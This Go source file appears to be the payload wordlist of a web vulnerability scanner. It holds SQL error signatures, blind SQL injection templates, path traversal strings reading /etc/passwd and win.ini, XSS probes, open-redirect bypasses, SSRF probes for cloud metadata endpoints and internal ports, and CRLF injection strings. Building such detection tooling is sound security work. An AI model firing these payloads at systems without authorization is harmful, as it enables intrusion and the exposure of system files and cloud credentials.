package wordlists

import (
	"regexp"
)

// SQL Error patterns covering MySQL/MariaDB, PostgreSQL, MSSQL, Oracle, SQLite, IBM DB2, Sybase, Firebird, Informix.
// Compiled from standard industry error signatures (e.g. sqlmap errors.xml and OWASP SQLi datasets).
var SQLErrorRegex = regexp.MustCompile(`(?i)(` +
	// MySQL / MariaDB
	`you have an error in your sql syntax|` +
	`error in your sql syntax|` +
	`check the manual that corresponds to your (mysql|mariadb) server version|` +
	`sql syntax.*mysql|` +
	`warning.*mysql_|` +
	`valid mysql result|` +
	`mysqlclient\.|` +
	`com\.mysql\.jdbc\.exceptions|` +
	`unknown column '[^']+' in 'field list'|` +
	`mysqlexception \(0x|` +
	// PostgreSQL
	`postgresql.*error|` +
	`warning.*\Wpg_|` +
	`valid postgresql result|` +
	`npgsql\.|` +
	`pg::syntaxerror:|` +
	`org\.postgresql\.util\.psqlexception|` +
	`error:\s+syntax error at or near|` +
	`error:\s+column "[^"]+" does not exist|` +
	// Microsoft SQL Server
	`driver.*sql[\-\_\ ]*server|` +
	`ole db.*sql server|` +
	`\bunclosed quotation mark after the character string|` +
	`\bincorrect syntax near|` +
	`system\.data\.sqlclient\.sqlexception|` +
	`\[microsoft\]\[odbc sql server driver\]|` +
	// Oracle
	`\bora\-[0-9]{4,5}|` +
	`oracle error|` +
	`oracle.*driver|` +
	`warning.*\Woci_|` +
	`quoted string not properly terminated|` +
	// SQLite
	`sqlite/jdbcdriver|` +
	`sqlite\.exception|` +
	`system\.data\.sqlite\.sqliteexception|` +
	`sqlite3\.operationalerror:|` +
	`no such table:|` +
	`syntax error near|` +
	// IBM DB2
	`cli driver.*db2|` +
	`db2 sql error|` +
	`\[ibm\]\[cli driver\]\[db2/\]|` +
	// Sybase
	`sybase message:|` +
	`sybase.*server message|` +
	`sybsqlexception|` +
	// Firebird & Informix
	`dynamic sql error|` +
	`sql error code = \-[0-9]{3}|` +
	`informix odbc driver|` +
	`odbc informix driver` +
	`)`)

// SQL Boolean Pairs for differential blind analysis
var SQLBooleanPairs = [][2]string{
	// Numeric context
	{"%s AND 1=1", "%s AND 1=2"},
	{"%s AND 1=1-- -", "%s AND 1=2-- -"},
	{"%s AND 1=1#", "%s AND 1=2#"},
	{"%s AND (1=1)", "%s AND (1=2)"},
	// Single-quote context
	{"%s' AND '1'='1", "%s' AND '1'='2"},
	{"%s' AND 1=1-- -", "%s' AND 1=2-- -"},
	{"%s' AND 1=1#", "%s' AND 1=2#"},
	{"%s' AND '1'='1'-- -", "%s' AND '1'='2'-- -"},
	{"%s' AND ('1'='1", "%s' AND ('1'='2"},
	// Double-quote context
	{"%s\" AND \"1\"=\"1", "%s\" AND \"1\"=\"2"},
	{"%s\" AND 1=1-- -", "%s\" AND 1=2-- -"},
	{"%s\" AND 1=1#", "%s\" AND 1=2#"},
	// Parenthesis breakout
	{"%s') AND ('1'='1", "%s') AND ('1'='2"},
	{"%s') AND 1=1-- -", "%s') AND 1=2-- -"},
	{"%s') AND 1=1#", "%s') AND 1=2#"},
	{"%s\")) AND ((\"1\"=\"1", "%s\")) AND ((\"1\"=\"2"},
	{"%s\")) AND 1=1-- -", "%s\")) AND 1=2-- -"},
}

// SQL Time-based sleep templates for major database families
var SQLTimeSleepTemplates = []string{
	// MySQL / MariaDB
	"%s' AND (SELECT 1 FROM (SELECT(SLEEP(%d)))a)-- -",
	"%s\" AND (SELECT 1 FROM (SELECT(SLEEP(%d)))a)-- -",
	"%s AND (SELECT 1 FROM (SELECT(SLEEP(%d)))a)-- -",
	// PostgreSQL
	"%s' AND (SELECT 1 FROM (SELECT pg_sleep(%d))a)-- -",
	"%s\" AND (SELECT 1 FROM (SELECT pg_sleep(%d))a)-- -",
	"%s AND (SELECT 1 FROM (SELECT pg_sleep(%d))a)-- -",
	// Microsoft SQL Server
	"%s'; WAITFOR DELAY '0:0:%d'-- -",
	"%s\"; WAITFOR DELAY '0:0:%d'-- -",
}

// LFI Traversal Payloads (standard, deep, URL encoded, null-byte, and OS specific)
var LFITraversalPayloads = []struct {
	Path  string
	Regex *regexp.Regexp
}{
	// Linux / Unix /etc/passwd
	{"../../../../etc/passwd", regexp.MustCompile(`root:[^:]*?:0:0:`)},
	{"../../../../../../../../etc/passwd", regexp.MustCompile(`root:[^:]*?:0:0:`)},
	{"../../../../../../../../../../../../etc/passwd", regexp.MustCompile(`root:[^:]*?:0:0:`)},
	{"../../../../../../../../etc/passwd%00", regexp.MustCompile(`root:[^:]*?:0:0:`)},
	{"..%2f..%2f..%2f..%2fetc%2fpasswd", regexp.MustCompile(`root:[^:]*?:0:0:`)},
	{"..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd", regexp.MustCompile(`root:[^:]*?:0:0:`)},
	{"..%252f..%252f..%252f..%252fetc%252fpasswd", regexp.MustCompile(`root:[^:]*?:0:0:`)},
	{"....//....//....//etc/passwd", regexp.MustCompile(`root:[^:]*?:0:0:`)},
	{"....//....//....//....//....//....//etc/passwd", regexp.MustCompile(`root:[^:]*?:0:0:`)},
	{"/etc/passwd", regexp.MustCompile(`root:[^:]*?:0:0:`)},
	// Linux /etc/hosts
	{"../../../../../../../../etc/hosts", regexp.MustCompile(`(?i)(127\.0\.0\.1\s+localhost|::1\s+localhost)`)},
	// Windows win.ini
	{"../../../../windows/win.ini", regexp.MustCompile(`(?i)\[(?:fonts|extensions)\]`)},
	{"../../../../../../../../windows/win.ini", regexp.MustCompile(`(?i)\[(?:fonts|extensions)\]`)},
	{"..\\..\\..\\..\\windows\\win.ini", regexp.MustCompile(`(?i)\[(?:fonts|extensions)\]`)},
	{"..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini", regexp.MustCompile(`(?i)\[(?:fonts|extensions)\]`)},
	{"C:\\windows\\win.ini", regexp.MustCompile(`(?i)\[(?:fonts|extensions)\]`)},
}

// XSS Probes across active HTML, attribute, script, and modern template contexts
var XSSProbes = []struct {
	Context     string
	Payload     string
	MustContain string
}{
	{"HTML Tag Injection", "<script>alert(1)</script>", "<script>alert(1)</script>"},
	{"Attribute Breakout (Double-Quote)", "\"><script>alert(1)</script>", "\"><script>alert(1)</script>"},
	{"Attribute Breakout (Single-Quote)", "'><script>alert(1)</script>", "'><script>alert(1)</script>"},
	{"Image Event Handler", "<img src=x onerror=alert(1)>", "<img src=x onerror=alert(1)>"},
	{"SVG Event Handler", "<svg onload=alert(1)>", "<svg onload=alert(1)>"},
	{"SVG Slash Syntax", "<svg/onload=alert(1)>", "<svg/onload=alert(1)>"},
	{"JavaScript Inline Context (Single-Quote)", "';alert(1)//", "';alert(1)//"},
	{"JavaScript Inline Context (Double-Quote)", "\";alert(1)//", "\";alert(1)//"},
	{"Single-Quote Attribute Expression", "'-alert(1)-'", "'-alert(1)-'"},
	{"Double-Quote Attribute Expression", "\"-alert(1)-\"", "\"-alert(1)-\""},
	{"Template Literal Breakout", "${alert(1)}", "${alert(1)}"},
	{"JavaScript Pseudo-Protocol", "javascript:alert(1)", "javascript:alert(1)"},
}

// Open Redirect Payloads & modern bypass vectors
var RedirectPayloads = []string{
	"https://example.com",
	"//example.com",
	"///example.com",
	"/\\example.com",
	"\\/example.com",
	"https:example.com",
	"https://example.com%23",
	"https://example.com%2f%2f",
	"@example.com",
	"//example.com%2f",
	"/https://example.com",
	"https://example.com/target",
}

// SSRF Probes targeting local file inclusion (SSRF+LFI), loopback access, and cloud metadata
var SSRFProbes = []struct {
	TargetType string
	Category   string
	Payload    string
	Indicators []string
}{
	// 1. SSRF to Local File Inclusion (SSRF+LFI via file:// protocol)
	{"Local File Inclusion (file:///etc/passwd)", "lfi", "file:///etc/passwd", []string{"root:x:0:0:", "root:/root:", "/bin/bash", "/bin/sh", "daemon:x:"}},
	{"Local File Inclusion (file:///etc/hosts)", "lfi", "file:///etc/hosts", []string{"localhost", "127.0.0.1", "ip6-localhost"}},
	{"Local File Inclusion (file:///etc/issue)", "lfi", "file:///etc/issue", []string{"ubuntu", "debian", "linux", "release"}},
	{"Local File Inclusion (file:///etc/nginx/nginx.conf)", "lfi", "file:///etc/nginx/nginx.conf", []string{"worker_processes", "events {", "nginx.pid"}},
	{"Windows File Inclusion (file:///c:/windows/win.ini)", "lfi", "file:///c:/windows/win.ini", []string{"[fonts]", "[extensions]", "for 16-bit app support"}},

	// 2. Localhost & Loopback Services
	{"Local Loopback Service (127.0.0.1)", "loopback", "http://127.0.0.1/", []string{"discover.hard", "internal", "dashboard", "admin", "console", "welcome"}},
	{"Local Loopback Service (localhost)", "loopback", "http://localhost/", []string{"discover.hard", "internal", "dashboard", "admin", "console", "welcome"}},
	{"Local Loopback Service (127.0.0.1:80)", "loopback", "http://127.0.0.1:80/", []string{"discover.hard", "internal", "admin"}},
	{"Local Loopback Shortened (127.1)", "loopback", "http://127.1/", []string{"discover.hard", "internal", "admin"}},
	{"Local Loopback IPv6 ([::1])", "loopback", "http://[::1]/", []string{"discover.hard", "internal", "admin"}},
	{"Local Loopback Decimal IP", "loopback", "http://2130706433/", []string{"discover.hard", "internal", "admin"}},
	{"Local Loopback Hex IP", "loopback", "http://0x7f000001/", []string{"discover.hard", "internal", "admin"}},
	{"Local Loopback 0.0.0.0", "loopback", "http://0.0.0.0/", []string{"discover.hard", "internal", "admin"}},

	// 3. Common Internal Service Ports
	{"Internal Service (Redis 6379)", "service", "http://127.0.0.1:6379/", []string{"-err unknown command", "+pong", "redis_version"}},
	{"Internal Service (Web Alt 8080)", "service", "http://127.0.0.1:8080/", []string{"apache", "nginx", "tomcat", "jenkins", "spring", "swagger"}},
	{"Internal Service (Dev Server 3000)", "service", "http://127.0.0.1:3000/", []string{"react", "next", "grafana", "node", "express"}},
	{"Internal Service (Dev Server 5000)", "service", "http://127.0.0.1:5000/", []string{"flask", "werkzeug", "python", "fastapi"}},
	{"Internal Service (Dev Server 8000)", "service", "http://127.0.0.1:8000/", []string{"django", "fastapi", "python", "php"}},

	// 4. Cloud Metadata Endpoints
	{"Cloud Metadata (AWS / OpenStack)", "cloud", "http://169.254.169.254/latest/meta-data/", []string{"ami-id", "instance-id", "local-ipv4", "security-groups"}},
	{"Cloud Metadata (GCP)", "cloud", "http://metadata.google.internal/computeMetadata/v1/instance/id", []string{"computemetadata/v1", "project-id"}},
	{"Cloud Metadata (Azure)", "cloud", "http://169.254.169.254/metadata/instance?api-version=2021-02-01", []string{"azenvironment", "compute", "vmid"}},
	{"Cloud Metadata (DigitalOcean)", "cloud", "http://169.254.169.254/metadata/v1/id", []string{"droplet_id", "hostname"}},
}

// CRLF Injection Payloads
var CRLFPayloads = []struct {
	Name    string
	Payload string
}{
	{"URL-Encoded CRLF", "%0d%0aX-Injected-Header:%20nflx_crlf"},
	{"Double URL-Encoded CRLF", "%250d%250aX-Injected-Header:%20nflx_crlf"},
	{"Set-Cookie CRLF", "%0d%0aSet-Cookie:%20nflx_crlf=1"},
	{"LF Only Injection", "%0aX-Injected-Header:%20nflx_crlf"},
	{"Unicode Overlong CRLF", "%E5%98%8D%E5%98%8AX-Injected-Header:%20nflx_crlf"},
}
